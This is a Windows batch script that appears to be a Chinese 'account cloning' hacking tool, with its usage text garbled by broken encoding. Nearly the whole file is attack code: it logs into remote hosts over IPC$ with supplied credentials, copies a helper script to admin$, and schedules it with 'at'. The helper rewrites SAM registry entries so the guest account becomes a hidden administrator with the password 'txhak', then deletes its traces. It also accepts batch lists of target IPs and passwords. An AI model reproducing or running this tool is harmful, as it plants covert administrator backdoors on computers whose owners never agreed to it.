@echo off
color 3e 
cls
Rem ==========================������ca.bat������=====================================
echo @echo off   >ca.bat
echo net user guest txhak    >>ca.bat
echo net user guest /active:no    >>ca.bat
echo echo Windows Registry Editor Version 5.00    ^>txhak.reg    >>ca.bat
echo echo.      ^>^>c:\txhak.reg            >>ca.bat                         
echo echo [HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5]     ^>^>txhak.reg    >>ca.bat
echo regedit /e Y1f4.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4     >>ca.bat
echo regedit /e Y1f5.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5    >>ca.bat
echo more +3 ^<Y1f4.reg      ^>^>txhak.reg    >>ca.bat
echo more +7 ^<Y1f5.reg      ^>^>txhak.reg    >>ca.bat
echo regedit /s txhak.reg    >>ca.bat
echo del /q Y1f4.reg    >>ca.bat
echo del /q Y1f5.reg    >>ca.bat
echo del /q txhak.reg    >>ca.bat
echo del /q ca.bat    >>ca.bat
echo exit    >>ca.bat
Rem ==========================������ipc.bat������====================================
echo @echo off  >ipc.bat
echo echo.    >>ipc.bat
echo echo ��������%%1...    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ %%3 /user:%%2 ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo ���ڴ���ca.bat    >>ipc.bat
echo echo.    >>ipc.bat
echo copy ca.bat \\%%1\admin$\system32  /y ^& IF errorlevel 1 echo. ^& echo ��������Ѫ��OpenShare��admin$���� ^& goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo ���ڲ�ѯ%%1�ĵ�ǰʱ��    >>ipc.bat
echo echo.    >>ipc.bat
echo net time \\%%1 /set /y ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo for /f "tokens=1,2 delims=:"  %%%%i in ("%%time%%") do set /a hh=%%%%i ^& set /a mm=%%%%j    >>ipc.bat
echo echo %%1��ǰʱ��Ϊ%%hh%%:%%mm%%    >>ipc.bat
echo set /a mm=%%mm%%+1    >>ipc.bat
echo if /i %%mm%% geq 60 set /a mm=0 ^& set /a hh=%%hh%%+1    >>ipc.bat
echo if /i %%hh%% geq 24 set /a hh=0    >>ipc.bat
echo set tm=%%hh%%:%%mm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo echo ���ÿ�¡�ʺ�ִ�е�ʱ��Ϊ%%tm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% ca.bat  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.  >>ipc.bat
echo echo ����ٹ�60�룬��¡�ʺžͻ���Ч�����Ժ�...    >>ipc.bat
echo goto :BYE    >>ipc.bat
echo :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ /del /y    >>ipc.bat
echo echo %%1���ִ�������ܳɹ���ɣ�    >>ipc.bat
echo echo.    >>ipc.bat
echo goto :exit    >>ipc.bat
echo :BYE    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ /del /y    >>ipc.bat
echo echo %%1�ɹ������������    >>ipc.bat
echo echo.    >>ipc.bat
echo :exit    >>ipc.bat
echo echo ------------------------------------------------------    >>ipc.bat
echo exit   >>ipc.bat
Rem ======================================��======================================


if {%1}== {} goto :Usage
if {%2}== {} goto :file
if {%3}== {} goto :Usage
if not {%3}== {} goto :open

:File
echo ======================================================
echo                 ��Ѫ-CA V1.0          
echo ======================================================
if not exist %1 echo ָ���ļ�������! & pause & goto  Usage
for /f "tokens=1-3 delims= "  %%i in (%1) do  start /b /wait ipc.bat %%i %%j %%k
goto exit

:Open
echo ======================================================
echo                 ��Ѫ-CA V1.0       
echo ======================================================
start /b /wait ipc.bat %1 %2 %3
goto exit


:Usage
cls
echo ======================================================
echo                 ��Ѫ-CA V1.0    
echo            Download by  С���    ChineseHack.org       
echo ======================================================
echo ��ȫ��������д��Զ�̿�¡�ʺŵĹ��ߡ�
echo ���admin$û�򿪣���������Ѫ��OPenShare�򿪡�
echo �ÿ�¡�ʺŹ��߻��¡guest�û�Ϊ����Ա��������txhak��
echo ���ߣ���Ѫ
echo ��ҳ��http://txhak.5inet.cn/
echo ���䣺txhak@etang.com
echo QQ:   22540685
echo txca.bat [IP] [�û���] [����]
echo txca.bat [�⼦�ļ�]
echo ���ָ���⼦�ļ����������ļ��ж�ȡip �û��� ����
echo �⼦�ļ����ļ���ʽΪip �û��� ���롣�ո������
echo ��1��txca 192.168.0.2 user "" 
echo ��2��txca file.txt
echo �⼦�ļ���ʽ���£��ո��������
echo 192.168.0.1 user ""
echo 192.168.0.2 administrator 123
echo 192.168.0.24 administrator admin
echo ------------------------------------------------------

:exit